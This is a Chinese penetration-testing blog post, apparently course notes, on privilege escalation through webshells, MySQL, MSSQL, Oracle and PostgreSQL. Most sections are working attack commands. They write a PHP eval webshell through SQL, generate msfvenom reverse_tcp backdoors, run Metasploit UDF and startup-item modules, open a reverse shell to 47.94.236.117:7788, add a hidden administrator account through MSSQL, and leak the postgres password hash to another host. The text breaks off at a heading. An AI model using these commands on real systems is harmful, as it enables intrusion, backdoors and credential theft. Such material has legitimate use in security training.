



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="X_T" href="http://www.n1h1l157.live/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="X_T" href="http://www.n1h1l157.live/atom.xml" />
<link rel="alternate" type="application/json" title="X_T" href="http://www.n1h1l157.live/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="渗透测试" />


<link rel="canonical" href="http://www.n1h1l157.live/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">



  <title>
XD22 9 权限提升 - 信息安全 |
Phut Hon = X_T = 天行健，君子以自强不息</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">XD22 9 权限提升
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2022-12-30 00:00:00">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2022-12-30T00:00:00+08:00">2022-12-30</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>19k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>32 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/js4tJW7km8aqygU.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/C83rXtNWOS4dPh6.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/YxVAkEwQdF9thjc.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/Pqn3SXIzyRidv6H.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/DmrBVlwMeUxpa4K.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/1idBqMQ7tmDOfXW.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 信息安全"><span itemprop="name">信息安全</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://www.n1h1l157.live/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content=".N1h1l157">
    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="X_T">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h3 id="webshell-提权"><a class="markdownIt-Anchor" href="#webshell-提权">#</a> webshell 提权</h3>
<h4 id="phpmyadmin-突破"><a class="markdownIt-Anchor" href="#phpmyadmin-突破">#</a> phpmyadmin 突破</h4>
<p>phpadmin 通过后台写 sql 拿 webshell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示当前目录</span></span><br><span class="line">show variables like &#x27;%datadir%&#x27;;或 select @@basedir;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看数据库当前操作用户拥有写权限</span></span><br><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入后门</span></span><br><span class="line">select &#x27;&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;&#x27; INTO OUTFILE &#x27;/var/lib/mysql/a.php&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启慢日志记录</span></span><br><span class="line">set global slow_query_log=1;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置日志存储目录</span></span><br><span class="line">set global slow_query_log_file=&#x27;/var/lib/www/blog.1.php&#x27;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入木马记录在日志</span></span><br><span class="line">select &#x27;&lt;?php eval($_GET[A])?&gt;&#x27; or SLEEP(1);</span><br></pre></td></tr></table></figure>
<p><strong>secure_file_priv 参数：NULL 不允许导入或导出、/tmp 只允许在 /tmp 目录导入导出、空则不限制目录</strong><br>
<strong> root 高权限读文件：UNION SELECT 1,load_file (‘d:/w.txt’),3</strong><br>
<strong>root 高权限写文件：UNION SELECT 1,‘xxxx’,3 into outfile 'd:/www.txt’</strong></p>
<h4 id="win-web-提权"><a class="markdownIt-Anchor" href="#win-web-提权">#</a> win web 提权</h4>
<ul>
<li>信息收集</li>
</ul>
<p>操作系统版本、漏洞补丁、系统位数、杀软防护、网络情况、当前权限等 信息。如 ver、systeminfo、whoami、netstat -ano、tasklist /svc 等。</p>
<p>如果提权中无法执行命令，需要通过 web 权限上传 cmd.exej 进行执行，基 于补丁和系统版本位数来进行筛选可用溢出漏洞 EXP、手工操作、基于 CS 的 半自动化提权、基于 MSF 的全自动化提权。</p>
<ul>
<li>手工查找 CVE 与 EXP</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bG1vbi9WdWxtYXA=">https://github.com/vulmon/Vulmap</span> (不建议)</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JpdHNhZG1pbi93ZXNuZw==">https://github.com/bitsadmin/wesng</span> (systeminfo&gt; 1.txt, 之后用 wesng 去解析， 效果一般)</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nocm9ibGVydC9XaW5kb3dzVnVsblNjYW4=">https://github.com/chroblert/WindowsVulnScan</span> (.\KBCollect.ps1 生成 KB.json 再去解析)</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4=">https://i.hacking8.com/tiquan</span> (将 systeminfo 的信息输入到此页面查找漏洞)</p>
<ul>
<li>工具辅助提权</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FzY290YmUvS2VybmVsSHVi">https://github.com/Ascotbe/KernelHub</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25vbWktc2VjL1BvQy1pbi1HaXRIdWI=">https://github.com/nomi-sec/PoC-in-GitHub</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2s4Z2VnZS9MYWRvbg==">https://github.com/k8gege/Ladon</span></p>
<p>工具提权不一定能成功，因为受作者测试环境与真实环境的不同，脚本难以完全一致，通常会选取 msf/cs 的自动化提权，毕竟经过了时间的考究。</p>
<h4 id="msf-全自动提权"><a class="markdownIt-Anchor" href="#msf-全自动提权">#</a> MSF 全自动提权</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成反弹后门</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=3333 -f exe -o msf.exe</span><br><span class="line">msfvenom - a x86 --platform windows - p windows/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=4444 - b &quot;\x00&quot; - i 10 - f exe - o ~/Desktop/t.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置监听会话</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">筛选EXP模块</span></span><br><span class="line">background</span><br><span class="line">use post/windows/gather/enum_patches（半自动：根据漏洞编号找出系统中安装的补丁）</span><br><span class="line">use post/multi/recon/local_exploit_suggester（全自动：快速识别系统中可能被利用的漏洞）</span><br><span class="line">set session 1</span><br><span class="line">set showdescription true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">特别注意如果没有显示出来漏洞利用脚本，需要更新msf即使用msfupdate命令</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用EXP溢出提权，注意需要重新监听会话并指定端口</span></span><br><span class="line">background</span><br><span class="line">use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class="line">set localhot. set local port</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<h4 id="cs半自动化提权"><a class="markdownIt-Anchor" href="#cs半自动化提权">#</a> cs 半自动化提权</h4>
<ul>
<li>配置启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器启动服务端</span></span><br><span class="line">chmod +x teamserver &amp; ./teamserver IP password</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端连接服务端</span></span><br><span class="line">运行cobaltstrike.bat（运行不起来请检测JDK版本）</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>配置监听器生成后执行</p>
</li>
<li>
<p>选择提权模块调用执行，默认的脚本不够好，需要用加载的如 taowu、lodon 脚本</p>
</li>
</ul>
<h3 id="数据库提权"><a class="markdownIt-Anchor" href="#数据库提权">#</a> 数据库提权</h3>
<h4 id="mysql-提权"><a class="markdownIt-Anchor" href="#mysql-提权">#</a> mysql 提权</h4>
<p>用系统漏洞提权要比数据库漏洞提权更容易得到权限。</p>
<p>一般采用 UDF 提权和启动项的方式，都需要拿到此时的数据库的 root 权限， 并且两者都是需要往特殊目录下写入文件，并且需要 - secure-file-priv 没进行目 录限制，如果做了目录限制是无法提权到系统权限的</p>
<ul>
<li>mysql UDF 提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql&lt;5.2 导出目录</span></span><br><span class="line">c:/windows或system32；</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql=&gt;5.2 导出安装目录/lib/plugin/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">select version()查看当前的数据库版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">select @@basedir查看当前的目录</span></span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;帐号&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;密码&#x27; WITH GRANT OPTION;允许所有账户的外连</span><br></pre></td></tr></table></figure>
<p>使用 MSF 中的 exploit/multi/mysql/mysql_udf_payload 模块可以进行 UDF 提 权，MSF 会将 dll 文件写入 lib\plugin\ 目录下 (如果没有 /lib/plugin/ 这个目录，需要 手动创建这个文件夹), 该 dll 文件中包含 sys_exec () 和 sys_eval () 两个函数，但是 默认只创建 sys_exec () 函数，该函数执行并不会有回显。我们可以手动创建 sys_eval () 函数，来执行有回显的命令。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MSF:（前提先开外连）</span></span><br><span class="line">use exploit/multi/mysql/mysql_udf_payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set password root</span><br><span class="line">set rhosts 47.102.195.100</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当msf将dll文件写入/lib/plugin下，可使用Navicat调用系统命令</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看</span></span><br><span class="line">select * from mysql.func where name = &quot;sys_exec&quot;; </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建函数绑定dll</span></span><br><span class="line">create function sys_eval returns string soname &quot;WqkerHcA.dll&quot;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">调用函数进行命令执行</span></span><br><span class="line">select sys_eval(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure>
<ul>
<li>mysql 启动项提权</li>
</ul>
<p>写一些启动项到 windows 上，windows 启动后会启动这类 bat 或者 exe，可以在 bat 中加 calc pause 进行测试。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MSF：（前提先开外连）</span></span><br><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line">set rhosts 47.102.195.100</span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<ul>
<li>mysql 通过 udf 反弹 shell</li>
</ul>
<p>原理同 udf 提权，再 plugin 下写入 dll 文件，用 sys_exec 调用 dll 执行系统命令，从而反弹 shell，需要提前监听 shell 端口（如果 linux 的话就是 so 文件）。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://blog.csdn.net/weixin_43801718/article/details/105493042</span></span><br><span class="line">use mysql;</span><br><span class="line">set @a=concat(&#x27;&#x27;,</span><br><span class="line">create table Ghost(data LONGBLOB);</span><br><span class="line">insert into Ghost values(&quot;&quot;);update Ghost set data = @a;</span><br><span class="line">select data from Ghost into DUMPFILE &#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;;</span><br><span class="line">create function backshell returns string soname &#x27;udf.dll&#x27;;</span><br><span class="line">select backshell(&#x27;47.94.236.117&#x27;,7788)</span><br></pre></td></tr></table></figure>
<ul>
<li>MOF 提权</li>
</ul>
<p>MOF-Win2008 后权限控制导致无效（不好用）<br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veGlzaGFvbmlhbi9wLzYzODQ1MzUuaHRtbA==">https://www.cnblogs.com/xishaonian/p/6384535.html</span></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MSF：</span></span><br><span class="line">use exploit/windows/mysql/mysql_mof</span><br></pre></td></tr></table></figure>
<h4 id="mssql-提权"><a class="markdownIt-Anchor" href="#mssql-提权">#</a> mssql 提权</h4>
<p>MSSQL 提权（windows 安装的，在 linux 上没有）</p>
<ul>
<li>xp_cmdshell 提权</li>
</ul>
<p>xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。如果用户拥有管理员 sa 权限则可以用 sp_configure 重新开启它。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用</span></span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭</span></span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行</span></span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br><span class="line">如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</span><br><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\MicrosoftSQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure>
<ul>
<li>sp_oacreate 提权</li>
</ul>
<p>主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用</span></span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭</span></span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行</span></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec</span><br><span class="line">sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br></pre></td></tr></table></figure>
<ul>
<li>沙盒提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不开启的话在执行xp_regwrite会提示让我们开启：</span></span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码：</span></span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句：</span></span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行系统命令</span></span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net localgroup administrators margin /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
<ul>
<li>沙盒模式 SandBoxMode 参数含义（默认是 2 ）<br>
 <code>0</code> ：在任何所有者中禁止启用安全模式<br>
 <code>1</code>  ：为仅在允许范围内<br>
 <code>2</code>  ：必须在 access 模式下<br>
 <code>3</code> ：完全开启</li>
</ul>
<p>openrowset 是可以通过 OLE DB 访问 SQL Server 数据库，OLE DB 是应用 程序链接到 SQL Server 的的驱动程序。恢复配置如下:</p>
<p>–exec master…xp_regwrite ‘HKEY_LOCAL_MACHINE’,‘SOFTWARE\Microsoft\Jet\4.0\Engines’,‘SandBoxMo de’,‘REG_DWORD’,1;</p>
<p>–exec sp_configure ‘Ad Hoc Distributed Queries’,0;reconfigure; --exec sp_configure ‘show advanced options’,0;reconfigure;</p>
<h4 id="oracle-提权"><a class="markdownIt-Anchor" href="#oracle-提权">#</a> oracle 提权</h4>
<p>工具地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vb3JhY2xlc2hlbGw=">https://github.com/jas502n/oracleshell</span></p>
<ul>
<li>普通用户模式：</li>
</ul>
<p>前提是拥有一个普通的 oracle 连接账号，不需要 DBA 权限，可提权至 DBA，并以 oracle 实例运行的权限执行操作系统命令。</p>
<ul>
<li>DBA 用户模式：（自动化工具）</li>
</ul>
<p>拥有 DBA 账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</p>
<ul>
<li>注入提升模式：</li>
</ul>
<p>拥有一个 oracle 注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显。</p>
<h4 id="postgresql-提权"><a class="markdownIt-Anchor" href="#postgresql-提权">#</a> postgresql 提权</h4>
<p>PostgreSQL 是一款关系型数据库。其 3 到 10 版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。</p>
<ul>
<li>PostgreSQL 提权漏洞</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CVE-2018-1058 普通用户植入后门命令</span></span><br><span class="line">CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$</span><br><span class="line">select dblink_connect((select &#x27;hostaddr=10.0.0.1 port=5433 user=postgres</span><br><span class="line">password=chybeta sslmode=disable dbname=&#x27;||(SELECT passwd FROM pg_shadow</span><br><span class="line">WHERE usename=&#x27;postgres&#x27;)));</span><br><span class="line">SELECT pg_catalog.array_to_string($1,$2);</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">$ LANGUAGE SQL VOLATILE;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">管理员操作数据库触发</span></span><br><span class="line">docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub</span><br></pre></td></tr></table></figure>
<ul>
<li>PostgreSQL 高权限命令执行漏洞</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CVE-2019-9193</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在连接到的后门一般是哥斯拉中利用数据库操作中执行以下命令，其中<span class="built_in">id</span>表示需要执行的系统命令</span></span><br><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>
<h4 id="三方应用提权"><a class="markdownIt-Anchor" href="#三方应用提权">#</a> 三方应用提权</h4>
<p>通过 cs 的插件，如果此时已经通过 webshell 运行了 cs 木马，可以通过下 列插件来获取明文凭据，收集更多的内网信息，但是这不一定能收集成功，毕 竟有防火墙需要规避</p>
<p>远控类：Teamviewer 向日葵 Todesk VNC Radmin 等</p>
<p>密码类：各大浏览器 Xshell Navicat 3389 等</p>
<h3 id="win提权"><a class="markdownIt-Anchor" href="#win提权">#</a> win 提权</h3>
<h4 id="at-sc-提权"><a class="markdownIt-Anchor" href="#at-sc-提权">#</a> at sc 提权</h4>
<ul>
<li>at 命令提权</li>
